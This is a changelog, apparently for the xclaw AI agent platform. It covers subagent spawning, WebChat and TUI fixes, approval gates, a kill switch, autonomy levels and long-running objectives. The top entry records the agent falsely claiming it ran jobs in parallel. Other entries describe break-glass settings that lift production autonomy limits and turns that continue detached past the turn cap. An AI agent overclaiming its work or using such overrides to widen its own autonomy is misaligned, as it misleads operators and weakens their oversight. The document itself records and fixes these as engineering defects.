checks to run in parallel. It ran three **sequential** shell calls and reported
"ran the three jobs at the same time (three parallel shells)" — overclaiming
parallelism it had no way to achieve, because subagents were operator-initiated
only and it had no delegation tool.

- **`xclaw_spawn_agent`** delegates one self-contained slice of work to a
  subagent. Emitting several calls in a turn runs them concurrently, since the
  loop already batches independent tool calls. Added to the `act` and `browse`
  tool packs.
- **The agent decides.** The tool description carries the economics rather than a
  rule: delegate when a slice is slow (~10s+), genuinely independent, or needs
  its own workspace; do not for quick checks, because a child costs ~10-30s to
  start; never call work parallel unless it actually spawned it. Measured, with
  no hint in either prompt:
  - five cheap related checks → **one shell call, no subagents** (34ms)
  - three slow unrelated tasks → **three subagents** (60s / 14s / 15s)
- Guards fail closed with structured refusals: spawn depth
  (`swarm.maxSpawnDepth`, default 2), fan-out per run
  (`swarm.maxChildrenPerRun`, default 4, and a refused call does not consume
  budget), and a clamped child turn budget.

`inferPlane`'s `/spawn|subagent/` rule routed the new tool to the "agent" plane,
which has no handler — every call failed in about a millisecond and the model
quietly fell back to sequential shell commands. Mapped explicitly to `local`.

## 3.142.1 — say who can spawn a subagent (2026-08-19)

Asked the agent in WebChat to spawn three subagents for independent parallel
audits. It answered:

> Subagents: I cannot spawn them. Only file/shell/skill tools are available
> here — no subagent / spawn API — so the three audits cannot run as
> independent agents.

That is accurate. The agent is given four tools (`xclaw_bash`,
`xclaw_file_read`, `xclaw_file_write`, `xclaw_skill`); no spawn or delegate tool
exists in the registry, and no bundled skill provides one. `/subagents` stayed
empty before and after. Subagents and swarm are **operator-initiated** — from
the Control UI, the CLI, or the swarm API.

The Subagents view described what a subagent is but never said who can start
one, so a reader would reasonably assume the agent delegates when it would help.
It now says plainly that the chat agent cannot spawn them and where delegation
does happen.

Giving the agent a spawn tool is a real capability change — fan-out, cost and
recursion all follow from it — so it is left as a decision rather than assumed.

## 3.142.0 — Control UI reads like a product, not a debug view (2026-08-19)

Looked at the console the way someone opening it for the first time would, at a
normal desktop width rather than the narrow pane it had been reviewed in.

- **Engine internals no longer lead the front page.** The Overview opened with
  "Eviction / LRU — policy hybrid, LRU mode size_weighted", context-window tuning
  that means nothing to a new user. It now lives in Health & Ops as **Context
  window**, with a line explaining what it is, and the Overview is a balanced
  four-card grid of the things that actually matter: gateway, computer, channels,
  profile.
- **Raw values humanised.** `eval cron on (86400000ms)` reads `every 24h`;
  `autoApprove true` reads `yes` and is coloured amber, because auto-approving is
  a permissive setting worth noticing; six-figure limits carry thousands
  separators (`120,000`, `2,000`).

Swept the rest of the console for the same class of problem — remaining
`String()` values are small integer counts, and other intervals already route
through the schedule formatter.

## 3.141.1 — state the approval rule once, instead of per channel (2026-08-19)

3.141.0 fixed the duplicate approval card in WebChat — the same bug Telegram had
fixed months earlier. Both channels rediscovered it the same way: a user saw a
bogus second prompt. The rule lived in a code comment, so each new consumer was
going to repeat it.

- The post-timeout re-emission now carries **`restate: true`** on the event
  itself, so a consumer can tell an ask from a state update with one field and
  no knowledge of the history.
- `src/security/approval-events.mjs` states the rule once —
  `isNewApprovalAsk()` / `isApprovalRestate()` — with the reason it exists.
  Telegram gates on it; WebChat (browser-side) mirrors it on `data.restate` and
  updates the existing card instead of adding one.
- Tripwires extended: the loop must mark the re-emission, and both channels must
  gate on it.

## 3.141.0 — talked to the agent through WebChat and used every feature (2026-08-19)

Held a real conversation in the WebChat UI and exercised each capability the
agent is given, rather than reading the code. Two defects.

- **Duplicate approval card showing `{}`.** The agent loop emits
  `approval_required` twice — once when the pending is created (with arguments)
  and again as a state update when authorize times out (without them). Telegram
  already deduped this; WebChat rendered both, so a second card appeared with
  empty arguments and you could not tell what you were approving. Cards are now
  keyed by `pendingId`: a repeat marks the existing card timed out instead of
  adding a new one.
- **Allowlisted tools that do not exist were dropped in silence.** The profile
  allows `xclaw_file_list`/`list_dir`, but neither materialises, so the model was
  handed four tools and only discovered the gap mid-turn — it replied "there is
  no xclaw_file_list tool in this session". The filter now reports
  `missingAllowed` on the `tools/filtered` event and emits a `tools/allow_missing`
  warning. Aliases are not a gap: `x` and `xclaw_x` count as one capability, so
  listing both spellings reports nothing.

Verified working end to end through the UI: `xclaw_bash`, `xclaw_file_write`,
`xclaw_file_read`, `xclaw_skill`; the approval flow (card → Allow → "✓ allowed"
→ file actually written on disk); the abort button (mid-turn stop → "— stopped
—"); slash commands (`/help` listing all nine, `/pending`); markdown, code
blocks with copy, tool cards with timings, and suggestion chips.

## 3.140.2 — audited every control in the Control UI (2026-08-19)

Clicked all 313 visible controls across the 20 views (skipping the destructive
ones), recording console errors and failed requests for each. Two findings.

- **PagerDuty answered 502 when it simply was not configured.** A missing API
  token is a configuration state, not an upstream fault, so an optional
  integration looked like a broken gateway and logged a console error on every
  click. The eight PagerDuty endpoints now answer 200 with `{ok:false, reason}`
  for configuration states and keep 502 for genuine upstream failures. The UI
  renders "PagerDuty is not configured — set alerts.pagerduty.apiToken to use
  this." instead of dumping a raw failure object.
- `POST /point/pick` returning 400 with *"no pickable page (open the app in a
  tab or pass url)"* is correct and already surfaced in the UI — left alone.

Everything else — 311 controls — ran clean.

## 3.140.1 — fix a same-process temp-file rename race (2026-08-19)

`eval-regression` went red on the 3.140.0 push with
`ENOENT: rename '.../clock.json.tmp.4254' -> '.../clock.json'` in *parallel
acquires on different tabs*.

Two concurrent writers **inside the same process** built the same temp filename
from `process.pid`, so the first rename consumed the file and the second failed.
`src/browser/physics.mjs` (clock.json, tab leases, commit gates) and
`src/browser/role-binding.mjs` (session-roles.json) now name every temp file
uniquely per call, matching the fix the cost governor already carries.

Not caused by the UI work in 3.140.0 — a pre-existing race that CI parallelism
exposed. Fabric suite green 3/3 in isolation, full suite and ci-gate green.

## 3.140.0 — Control UI: kill switch and ledger (2026-08-19)

Comparing the gateway's route surface and the CLI against the Control UI's 19
views showed capabilities with no operator surface at all.

- **Kill switch.** `POST /stop` has existed and worked, but the console had no
  button for it — the most safety-critical control in the product was CLI-only.
  Health & Ops now leads with it: **Dry run** reports what would be stopped
  without touching anything, **Stop all** confirms first and then drains, both
  reporting sessions killed, WebSockets and SSE subscribers closed.
- **Ledger view.** The append-only audit trail behind `xclaw ledger` had no UI.
  New view with segment/size/writer stats, the 60 most recent events (click one
  for the full record), and a *who touched a path* lookup — every recorded
  command or write that referenced a file, with when, via, status and session.

Still CLI-only, and honestly so: `timeline`, `evolve`, `self-deploy` and
`harness` have no HTTP routes at all, so surfacing them needs gateway work
rather than a view.

Also: `.kv` blocks expect each pair wrapped in a row element; emitting flat
siblings made key and value stack instead of sitting either side of the card.

## 3.139.2 — the same serializer bug in the integrity hash (2026-08-19)

3.139.0 fixed `redactValue` reporting shared references as cycles. Auditing for
the same pattern found it a second time, in `stableStringify` — which
canonicalises tool-trace entries for the **tool hash chain** that guards
checkpoint resume.

- `stableStringify` now tracks the ancestor path rather than every object it has
  ever visited, so a value reachable twice from different branches serialises as
  itself instead of `"[Circular]"`. The canonical form again represents the data
  it is hashing.
- **No stored checkpoint is invalidated.** `canonicalizeToolEntry` builds a fresh
  scalar-only object, so shared references cannot occur inside it. Verified by
  recomputing the chain tip for all 167 stored checkpoints (139 carrying tool
  traces) before and after: zero tips changed.

Also audited where the original bug could have persisted corrupted data —
`redactEvent` wraps every SSE event, every WebSocket frame, durable memory lines
and soak ledger rows. Nothing on disk contains `[Circular]`; the damage was
confined to live payloads.

## 3.139.1 — Control UI: empty states and readable time (2026-08-19)

Looking at each view with real data showed the same gap repeatedly — a table
with nothing in it rendered a blank bar under the headers, with no explanation.
Some views said "No entries"; most said nothing.

- Six tables gained an empty state: job history, queue, approvals, checkpoints,
  swarm runs and merge proposals now say what is missing instead of showing a
  blank strip.
- `pending=—` on the approvals header now reads `pending=0`.
- Timestamps are relative in live tables — `2h ago`, `5d ago` — with the exact
  local time on hover, falling back to a date past 30 days. An absolute locale
  stamp made it hard to see at a glance what was recent.
- Output panes that had never been written to showed a lone em-dash in a box,
  which reads as a broken widget; they now say "no output yet".
- The cost governor showed `Paused false`; it reads `no` (the colour already
  carried the state).

## 3.139.0 — WebChat polish, and a serializer bug behind it (2026-08-19)

Driving a real WebChat conversation (rather than looking at the idle screen)
surfaced four broken suggestion chips reading `[`, `C`, `i`, `r`.

- **`redactValue` misreported shared references as cycles.** It added every
  object it visited to a `seen` set and never removed it, so a value reachable
  twice from *different branches* — not an ancestor cycle — was replaced with the
  string `"[Circular]"`. The webchat result carries `suggestions` and
  `reply.suggestions` as the same array, so the top-level copy arrived at the
  browser as that string and the UI rendered one chip per character. The walker
  now tracks the ancestor path, so genuine cycles are still caught and shared
  references survive. This affected any payload containing a repeated object,
  not only suggestions.
- **Tool cards show the argument that matters** — `xclaw_bash  uname -r` instead
  of a truncated blob of raw JSON. The full arguments remain in the expandable
  body, now pretty-printed.
- Suggestion chips ignore anything that is not an array, and fall back to the
  copy nested under `reply`, so a malformed payload degrades to no chips rather
  than nonsense.

## 3.138.1 — TUI width correctness, and a real deflake (2026-08-19)

- **Wide characters no longer break the layout.** Width was counted in
  JavaScript string length, so one CJK character, emoji or surrogate pair threw
  off every rule, wrap and caret. `charWidth`/`visibleWidth`/`sliceCells` now
  count terminal cells: two for CJK/Hangul/emoji, zero for combining marks and
  variation selectors.
- Wrapping keeps continuation lines inside the budget *including* their indent —
  an indented wrap previously overflowed by the width of the indent.
- `fitToWidth` advances by cell width, so a line of emoji clamps correctly
  instead of overflowing the pane.
- The empty-state hint is clamped like the footer; it was running off the edge
  in a narrow pane.

**`approval SLA under load` deflaked.** It slept a fixed 30ms and then asserted
20 pending approvals; under full-suite parallelism only 17 had registered. It
now polls to a deadline, and the decide-latency budget has headroom for a loaded
box. Three consecutive isolated runs green, full suite green.

## 3.138.0 — the TUI renders markdown (2026-08-19)

Screenshotting the running TUI mid-conversation showed what testing it with
one-line answers never did: model replies are markdown, and the TUI was printing
them raw. Literal `**bold**`, `##` headings and ``` fences on screen.

- **Markdown is rendered**: headings, bullets (`•`), ordered lists, block
  quotes, fenced and inline code, bold/italic, and links reduced to their text.
  Everything wraps with a hanging indent so lists stay readable.
- **The footer no longer runs off the edge.** It was cut mid-word by the
  terminal boundary (`5 turn(s`); the footer and the notice line are now clamped
  with an ellipsis that counts printable cells, not bytes.
- Replies get a left gutter and a trailing blank line, so an answer no longer
  runs flush into the input rule.
- `0 turn(s)` is no longer printed when a reply used no tool turns.

Two bugs in the width code, both found by running it rather than reading it:
`visibleWidth` scanned for its SGR pattern starting at the ESC byte instead of
the character after it, so it counted colour codes as visible text; and the same
function's regex had been double-escaped by the edit that introduced it. The
source now carries no literal control characters at all.

## 3.137.0 — TUI polish: it behaves like a terminal app now (2026-08-19)

3.136.0 looked right but did not feel right. Everything here came out of driving
it under a real pty rather than reading the code.

- **Arrow keys typed junk.** Escape sequences were filtered on their leading
  ESC byte, so the tail landed in the prompt: pressing Up left `[A` in the input.
  Keys are decoded properly now (`decodeKeys`), and unknown CSI sequences are
  swallowed instead of pasted.
- **Real line editing**: left/right, Home/End, Delete, and insert at the caret,
  with the cursor drawn in-place inside the text rather than always at the end.
- **Prompt history** on Up/Down, keeping your in-progress draft when you come
  back down.
- **A spinner that means something**: animates with elapsed seconds and names
  the tool it is waiting on (`running xclaw_bash  12s`).
- **Esc cancels a running turn** (Ctrl+C too), and the transcript records it as
  cancelled rather than leaving the spinner spinning.
- **Ctrl+C is now two-stage**: clears a non-empty prompt first, then asks for a
  second press to quit — no more losing a half-typed message.
- **No more full-screen flash.** The screen repainted with a clear-and-redraw on
  every keystroke; it now writes only the rows that changed. The trailing
  erase-to-end was also positioned one row too high and was wiping the footer.
- **Empty state** shows a hint instead of a blank void, tool output over four
  lines reports `+N more line(s)` instead of silently truncating, PgUp/PgDn
  scroll the transcript, and the footer summarises turns, tool calls and cost.

## 3.136.0 — the TUI is a conversation (2026-08-19)

3.135.0 shipped `xclaw tui` as a read-only status dashboard. That is not what a
TUI is for: you look at it, you cannot use it. `xclaw tui` is now a full-screen
conversational terminal UI, shaped after the Claude Code TUI.

- Header carries the mark, version, `provider/model · profile` and cwd; an
  accent notice line reports gateway readiness and any pending approvals.
- The transcript renders a turn the way you would want to read it: `> ` for
  your message, `⏺ tool(primary-arg)` for each tool call, `⎿ output` for its
  result, then `⏺` for the answer.
- A ruled input block is pinned to the bottom with a `▌` caret, and the footer
  shows the cost of the last turn.
- Streams from `/agent/run/stream` (NDJSON) against the running gateway, so
  tool calls appear as they happen rather than after the turn completes.
- `/status` (the old dashboard), `/clear`, `/help`, `/quit`; Ctrl+C exits.
  The dashboard is still reachable as `xclaw tui --status`, and `--once`,
  `--json` and `--no-colour` are unchanged.

`renderChatScreen` is a pure function (state in, lines out) and is tested for
layout, the busy state, and transcript overflow, alongside the tool-call
formatter and the wrapper.

## 3.135.0 — `xclaw tui` (2026-08-19)

There was no `xclaw tui`. The only terminal UI was `xclaw voice tui`, a
voice-specific REPL, and typing `xclaw tui` silently fell through to the help
text — so a release advertising a TUI shipped without one.

- **`xclaw tui`** is a live operator dashboard: gateway/computer health, agent
  provider and model, active sessions with channel and age, pending approvals
  with their risk tier, spend, and channel status. `q` quits, `r` refreshes,
  auto-refresh every 5s (`--interval`).
- It reads the **running gateway over HTTP**, not in-process state. `xclaw
  status` calls `listActiveSessions()` inside the CLI process, which is why it
  always reported `0` active sessions no matter what the gateway was doing.
- `--once` renders a single frame (also used when stdout is not a TTY, so it
  pipes cleanly), `--json` dumps the raw snapshot, `--no-colour` emits no ANSI
  at all, and `--help` documents the flags.
- Degrades honestly: when the gateway is unreachable it says so and tells you
  how to start it, rather than rendering empty panels.
- The frame renderer is a pure function (snapshot in, string out) and is
  covered by tests, including the gateway-down path and a regression guard for
  the `/info` computer field being `healthy` rather than `running`.

## 3.134.0 — release polish: the version you see is the version you run (2026-08-19)

Public-release pass over the two surfaces a new user actually meets.

- **The gateway reported v0.7.0.** `XCLAW_VERSION` was a hardcoded literal in
  `src/gateway/index.mjs` carrying a "keep in sync with package.json" comment —
  and it had drifted by three years of releases. Every surface repeated it:
  Control UI, WebChat sidebar, `/info`, `/status`. It now reads package.json,
  the way `report.mjs`, `dashboard.mjs` and `metrics.mjs` already did.
- **WebChat showed a blank void on an empty session.** `switchSession()` hid the
  landing before fetching history, so restoring a session with no messages left
  nothing on screen and nothing to click. The landing now returns when the
  restored thread is empty.
- **WebChat footer**: the voice/TTS status line was left-aligned under a centred
  hint and read as a stray fragment; it is centred and reserves its own line.
- **`xclaw voice tui` dumped a raw JSON probe on startup.** It now prints a
  branded banner with a readable llm/tts/stt/mic status block, an actionable
  note when the local model is not pulled (`ollama pull …`), and honours
  `--help` (previously ignored) and `--json` (the old probe output).

## 3.133.1 — live-verify fix: dry-run kill-switch actually killed (2026-08-19)

Found by driving the running gateway, not by tests: `POST /stop {"dryRun":true}`
aborted every live session and drained WS/SSE, then reported the kill as if it
were real. A dry-run probe — what doctor and the fire drill use to check the
kill-switch is wired — took down live work.

`handleStopAll` reads `req.body` only. The single-port stop intercept
(`stop-proxy.tryHandleGatewayStop`) runs inside `wrapWithComputerProxy`, ahead
of the main router, so nothing had parsed the body yet: `body` was always `{}`
and the `dryRun` branch was unreachable. The intercept now parses its own JSON
body (64KB cap, fail-soft). `routes/stop.mjs` does the same for the router path.

Live-proven both ways with a session running: `{"dryRun":true}` → `before:1`,
`sessionsKilled:0`, `killedSessions:[]`; `{}` → the session is killed and the
WS drained. Fire drill green.

## 3.133.0 — the 322-commit line actually runs (2026-08-19)

v3.132.1 shipped 322 commits in which most features existed as *patch scripts*
rather than committed code. The tree CI built was missing the wiring, and
`npm test` applied those patches in place — mutating 13 source files as it ran.
The suite therefore reported a different result on every invocation
(2744 tests/50 fail, then 2730/67 on the identical tree) and CI was red.

- **Every wire landed as code.** 34 patches applied — by hand where the patch
  text had drifted, since three no longer applied at all and
  `doctor-perf-ensure.patch` was itself corrupt (hunk headers claimed six
  context lines and carried four). `apply-ship-patches`, `apply-n10-wires
  --check`, `apply-complete-n3` and `land-all --check` are all clean.
  Among the things that were never actually reachable: the `/stop` kill-switch
  HTTP route was not registered; `beforeLiveTurn`/`afterLiveTurn` were imported
  but never called, so live loops ran with no cost or hallucination brake;
  failover hops each restarted from a fresh budget.
- **The suite no longer rewrites its own source.** Seven apply-* scripts write
  `horizon-offline.mjs` and ~34 test files invoke them concurrently;
  `writeFileSync` truncates before writing, so a concurrent reader could
  transform an empty file and write the emptiness back — that file went from
  413 lines to 0 bytes mid-run. Writes are now skipped when byte-identical and
  atomic (temp+rename) otherwise. Three consecutive runs now give an identical
  2749/0-fail, exit 0.
- **Workspace quota un-bricked, capability kept.** It was on unless explicitly
  disabled and fails closed after a full recursive walk that stats every file,
  so any workspace over 512MB/50k files — anything with a `node_modules` — had
  every write tool call denied. Measured: `authorize("xclaw_bash",
  {command:"echo hi"})` returned `WORKSPACE_QUOTA_EXCEEDED` after 2731ms, and
  4/5 subtests of the untouched `security-risk.test.mjs` failed. Now opt-in
  (inert without `workspace.quota` config) with the measurement memoised for
  `workspace.quota.measureTtlMs` (default 1500ms).
- **Real defects in never-executed modules**: `compactSeqLedger` ignored
  `cfg.compactFence` entirely, so a stale holder could compact;
  `acquireCompactLease` never issued a fencing token; `saveCheckpoint` never
  persisted `quotaHardCircuit`, so a tripped circuit was lost across a restart;
  `sse-fanout.closeRoom` reported no per-room count;
  `parseStructuredClaims` only accepted fenced JSON.
- **Tests corrected where they asserted the wrong thing**: several asserted
  `git apply --check` exits 0 — i.e. that a patch is still *pending*, which
  inverts the moment the feature ships; two froze horizon case counts that
  later packs legitimately grew; one required a patch file that was never
  committed. `test/helpers/patch-state.mjs` asserts landed-or-appliable.
- Kept Grok's prod skills-integrity hardening (no lockfile in prod now refuses
  unpinned skill injection) and updated the stale test that asserted the old
  fail-open contract.

## 3.132.0 — voice is a conversation (2026-08-18)

Live testing answered "does voice actually work during a conversation?" with:
tools yes, conversation no. Each `/ws/voice` utterance spawned a fresh
`runJob()` — no history, and an empty `/tmp/xclaw-jobs/...` workspace. Proven
before: turn 1 ran `hostname` and answered `srv1474168`; turn 2 asked what it
had just reported and answered *"This is the first message in the
conversation."*

- **Voice turns now run the channel-invariant agent** (the same path WebChat
  uses) keyed by a stable conversation id, in a real workspace. Same two turns
  now: `srv1474168`, then `srv1474168` from memory with no command re-run.
- **Resumable threads**: `/ws/voice?conversation=<id>` continues an existing
  conversation, so a dropped socket no longer means amnesia. Proven across two
  separate connections.
- **Files work**: a voice turn reads and writes in the session workspace
  instead of an empty throwaway job directory.
- **Tool activity streams mid-turn** (`event: "tool"`), so a client can show or
  announce progress while the agent is still working.
- **WebChat mic uses local STT**: `/api/voice/transcribe` now accepts uploaded
  audio (`audioBase64`), and the mic records via MediaRecorder and transcribes
  on the gateway. Works in any browser with a microphone and keeps the audio on
  your own machine; browser SpeechRecognition remains a fallback.

## 3.131.2 — live verification: the shipped voice stack now actually works (2026-08-18)

Every capability from the 3.77–3.80 line was exercised against the running
gateway. Six defects that tests could not see:

- **Gateway crash (DoS)**: `handlePcmBinary`/`handleOpusBinary` were called but
  never defined — a single binary frame from any authenticated `/ws/voice`
  client killed the gateway process, taking Telegram, webchat and jobs with it.
  Implemented both, capped buffered audio, and made a client fault fail the
  connection instead of the process.
- **Binary audio protocol was documentation only**: `pcm_start`/`pcm_end`/
  `opus_start`/`opus_end` were advertised in the `ready` frame but answered
  `unknown_type`. Implemented, sharing one turn path with text utterances.
- **WebRTC R1 never worked**: `webrtc_offer`/`ice`/`close` had no handlers
  despite `ready` advertising `signaling: true`, and `acceptOffer` used
  werift's object-form `RTCSessionDescription`, which throws. Wired and fixed —
  live: offer → 1341-byte answer SDP + trickling ICE.
- **Close frames ignored**: the server never completed the closing handshake,
  so one-shot clients hung forever and sessions leaked.
- **Edge clients could not authenticate**: neither voice client sent the gateway
  token, so they could never reach a secured gateway.
- **Probes reported absent binaries as present**: `spawn whisper-cli ENOENT`
  matched the name check, so doctor claimed STT and `readyForW1` were available
  with nothing installed. Spawn errors now fail closed.

Also: `autonomy.maxUsdPerDay` was decorative whenever `cost.dailyHardUsd` was
set (the stricter cap now wins), and jobs persist run snapshots by default so
`xclaw runs` and resume are usable.

## 3.131.1 — live-verify fix: tool calls on the default bundle engine (2026-08-18)

Found by driving the running gateway, not by tests: **every tool call failed**
with `InputValidationError: Unrecognized key(s) in object: 'cwd'`.

The 3.77-line added a per-call `cwd` pin to the args forwarded to the computer
engine (correct for its C5 native/module engines, whose schemas declare `cwd`,
and it also made `native` the default). 3.131.0 kept the live-proven `bundle`
(C4) default, whose frozen strict-zod schemas reject any unrecognized key — so
the combination killed every call before it executed.

- **router**: probe the engine's advertised `xclaw_bash` schema for `cwd` and
  strip `cwd`/`workingDir` before forwarding when absent — the same guard the
  router already applies to `systemRunPlan`. The bundle session already runs in
  its `createSession(workingDir)`, so nothing is lost; engines that declare
  `cwd` still receive the pin.
- Live-proven after fix: agent ran `uname -r` → `6.8.0-90-generic` in 1 turn;
  outside-workspace write still pends critical and denies with no file created;
  `/trust` set/status/clear works; governor records every run.

## 3.131.0 — reconcile: grok 3.77–3.80 line merged with 3.113–3.130 hardening (2026-08-18)

The 3.77.0–3.80.0 releases were authored on a parallel line against v3.76-era
file content and had reverted parts of the 3.113.0–3.130.0 line. This release
merges both lines with no capability lost from either:

- **Restored from 3.123–3.130** (deleted on the parallel line): risk-tier
  approval gate (`autoApproveMaxTier`, assessRisk in authorize), `/trust`
  bounded auto-run window backing, `riskWorkingDir` fail-closed outside-workspace
  write protection, cost-governor bands + billed/estimated split + owner-visible
  band alerts, objective auto-promotion, providers/channels doctor sections,
  SSRF-safe fetch in extra-tools, netns probe + degraded-honesty in os-sandbox.
- **Kept from 3.77–3.80**: full voice stack (VAD/Opus/WebRTC/TTS streaming +
  `/ws/voice` + metrics), autonomy levels + prod hardening, egress policy,
  browser fabric, approvals HTTP/CLI API + SLA, durable agent-run snapshots,
  WildClaw eval waves, self-evolve, set-of-marks browser ops, mock mail/chat
  tools, `channels telegram test`, grok-4.6 registry.
- **Defaults**: computer engine default stays "bundle" (C4, live-proven);
  C5 native remains selectable (`XCLAW_COMPUTER_ENGINE=native`).
- Version numbering continues forward from 3.130.0; the 3.77–3.80 tags remain
  as historical artifacts of the parallel line.

## 3.80.0 — Live voice stack

- **Local TTS/STT**: espeak/piper + whisper-cli; TUI / WebChat / Telegram
- **Voice commands**: mute/cancel/status/repeat via shared catalog + entente
- **Wake W0/W1**: energy + keyword probe; continuous `xclaw voice listen`
- **VAD**: hysteresis endpointing, noise-floor auto-calibrate
- **Latency**: barge-in SIGKILL process-group; sentence-flush TTS; stream LLM→TTS
- **Router**: casual vs agent vs command (skip tools on small-talk)
- **Gateway `/ws/voice`**: JSON utterances, binary **PCM**, **Opus** (O1–O3)
- **Metrics**: TTFA/VAD/barge-in ring; `voice metrics --chart`; `/control/voice.html`
- **Optional**: `opusscript` for Opus encode/decode packets


## 3.79.0 — hands-free evolve

- **Self-evolution**: `xclaw evolve status|tick|overlay`, heartbeat evolve phase, handler refresh on ensure
- **Checkpoints**: resume lock, mark resumed, prune (maxCount/maxAge), path-sorted list
- **Grounding**: path-binding claims ↔ tool evidence
- **Goals**: `xclaw goal --harness --exists/--contains/--cmd` → queue runs long harness
- **Resume CLI**: `--strategy --harness --max-turns --force`
- **Doctor**: harness.principles, checkpoints.store, evolve.handsFree
- **Tests**: offline fixtures for resume/approval/budget gates; path-bind; prune; resume-lock

### Hands-free / evolve
- Self-evolution tick: resume locks, checkpoint prune, path-binding grounding
- `xclaw goal --harness` queue path, heartbeat handler refresh
- Offline fixtures for resume gates (level, approval, budget)


> **Merge note (3.131.0):** entries 3.77.0–3.80.0 below were authored on a
> parallel line against a v3.76 base (concurrently with 3.113.0–3.130.0 on the
> main line) and were merged back together in 3.131.0. Version numbers between
> the two lines overlap in time, not in content.

## 3.78.1 — Telegram hardening (2026-08-17)

- **doctor**: telegram token/policy/rateLimit/writerLock/runtime/lastError
- **prod**: force `dmPolicy` off `open` → allowlist|pairing (`XCLAW_TELEGRAM_DM_POLICY` break-glass)
- **callbacks**: shared `authorizeTelegramCallback` (owner/allowlist/RATE_LIMITED)

## 3.78.0 — Operator features (2026-08-17)

- **browser**: set-of-marks click/type (`mark: N`) + MARK_* error codes
- **approvals**: CLI + `/approvals` API, `APPROVAL_NOT_FOUND`
- **cost**: hard stop `BUDGET_EXCEEDED` (day/job), agent loop gate, doctor
- **runs**: durable agent snapshots `~/.xclaw/agent-runs/`, `xclaw runs`
- **telegram**: `RATE_LIMITED`, `xclaw channels telegram test`

## 3.77.2 — Install guide (2026-08-17)

- **INSTALL.md**: v3.77.1+ checkout, self-test, prod autonomy/security pointers

## 3.77.1 — Security doc (2026-08-17)

- **SECURITY.md**: operator hygiene, prod gates, fabric/skills checklist; linked from README

## 3.77.0 — Autonomy, fabric, prod gates (2026-08-17)

Production-minded ops plane for long-lived agents:

- **Autonomy levels** (`off|supervised|lab|full`) + heartbeat + channel delivery (Telegram/Discord/Slack)
- **Prod hardening** — lab config cannot leak autoApprove into prod; `XCLAW_AUTONOMY_LEVEL` env wins
- **Browser fabric** — tab leases, commit gates, role bind, durable profile default
- **Hybrid observe** — set-of-marks + bbox; optional pixels
- **Jobs / queue / swarm** — verify absolute paths, checkpoint resume, host-workspace mode
- **Skills** — propose always; install owner-gated in prod (`xclaw skills install --owner-approved`)
- **Doctor / status / info / self-test / CI** — posture checks end-to-end
- **Docs** — AUTONOMY.md, FABRIC.md, MCP-PARITY.md, ROADMAP.md

### Prior unreleased notes (merged)

## Unreleased — Autonomy levels

- **enforceProdHardening**: prod forces autoApprove=false, clamps lab/full→supervised, swarm.autoMerge=false (break-glass: XCLAW_ALLOW_PROD_AUTO=1)
- **XCLAW_AUTONOMY_LEVEL** env wins over user config file

- **docs/FABRIC.md**: tab leases, commit gates, role bind, beforeNavigate order

- **docs/AUTONOMY.md**: levels, heartbeat, jobs/queue/swarm pointers

- **`src/config/autonomy-policy.mjs`**: levels `off | supervised | lab | full` → security + maxTurns + heartbeat defaults
- **`loadConfig`**: applies level without clobbering explicit user settings
- **doctor**: `autonomy.level` check
- **tests**: 7/7 autonomy-policy


## Unreleased — Queue workspace + verify paths

- **queue**: persist `workspace` on enqueue and pass through to `runJob`
- **gateway POST /queue**: accept `workspace`, `timeoutMs`, `maxAttempts`
- **verify**: resolve absolute check paths correctly via `resolveCheckPath`
- **Live verified**: queue → worker → succeeded, `queued.txt` = QUEUE_OK


## Unreleased — Job status bugfix

- **jobs/job.mjs**: replace undefined `options` with `opts` after verify/grounding (job was `failed` despite verify pass)
- **Live verified**: multi-phase `/jobs` long-horizon → `status=succeeded` `pass=true`, node --test green


## Unreleased — Swarm isolate path fixes

- **sandbox**: `allowPaths` honored without secondary `..` rejection
- **lab profile**: `sandbox.allowPaths: ["/tmp"]`
- **spawn**: child `planRoot` + `/tmp` allow when isolate under `/tmp`
- **approvals / agent loop**: systemRunPlan cwd pinned to tool/`workingDir` (fixes spawn enforce cwd drift)
- **Live verified**: swarm implement→verify writes `/tmp/xclaw-swarm-proof.txt` = `SWARM_LIVE_OK`, cwd drift 0

## Unreleased — Realtime buffer hardening

- **`src/shared/bounded-queue.mjs`**: drop_oldest / drop_newest queues with metrics
- **Eviction SSE** ring uses bounded queue; `evictionBufferMetrics()`
- **WS hub** per-client outbound queue (default 64) + `wsOutboundStats()`; drain-aware writes
- **StreamEventLog** (agent/swarm SSE resume) uses bounded queue; snapshot includes drops
- **Doctor**: `ws.outbound`, `eviction.buffer`, `stream.buffers` checks


## 3.127.1 — objective fresh-context fix + orphan resume + --version probes

Follow-ups from the v3.127.0 live proof mission:

- **Fresh-context violation fixed**: objective segments pass `history: []`,
  but the loop treated an empty array as "no history passed" and silently
  replayed the prior segment's transcript — reintroducing the
  context-window dependency the orchestrator exists to remove. An explicit
  empty array now suppresses transcript replay; callers that omit history
  keep today's behavior.
- **`/objective list` + `/objective resume <id>`**: resuming by id adopts
  the mission into the current chat (rebinds channel/chatId) — heals
  missions orphaned by ephemeral webchat sessions and lets Telegram adopt
  a mission started elsewhere.
- **`<cmd> --version` probes are read-only**: the live mission stalled
  ~13 minutes on `node --version` pending 120s per attempt. A bare
  `<head> --version` (sole argument) now classifies read-only regardless
  of head; `node -e`, `-v`, and any extra arguments still fail closed.

## 3.127.0 — long-running objectives: the mission survives execution boundaries

Fixes the traced architecture failure where a high-level channel objective
stopped after ~20–30 tool calls and asked "should I continue?" — the turn
cap (`agent.maxTurns` 15) was acting as the de-facto completion condition,
the rescue text manufactured the question, and the objective itself rolled
out of the 40-message history window. Full audit + design: docs/LONGRUN.md.

- **Durable objective state** (`src/agent/objective-store.mjs`):
  objective (immutable) · interpretation · completion criteria · plan ·
  current subtask · remaining · progress · findings · decisions ·
  constraints · open questions · failures · inspected files/dirs/components
  — atomic per-objective JSON, boot reconcile, lost-update-safe stop flag.
- **Segmented orchestrator** (`src/agent/objective.mjs`): MISSION → PLAN →
  ACT → VERIFY → UPDATE STATE → REPLAN → CONTINUE. Each segment is one
  loop run bounded by maxTurns (an execution constraint, never completion);
  fresh context per segment rebuilt from durable state makes context
  boundaries invisible; a fenced state block is the model↔runtime protocol.
  Criteria-driven completion with bounded anti-drift pushback; classified
  escalation (needs_human requires a concrete question; blocked gets one
  recovery pass); typed limits (segment budget pauses resumable, never
  dies); everything ledger-journaled.
- **Channel integration**: `/objective <goal>|status|stop|resume`;
  **auto-promotion** — a normal turn cut off by maxTurns becomes a mission
  automatically and continues detached (the old failure now *starts* the
  right machinery); messages during a run get status instead of forking a
  parallel task; the owner's next message answers an escalated question.
  Telegram pushes detached updates; webchat appends to the session.
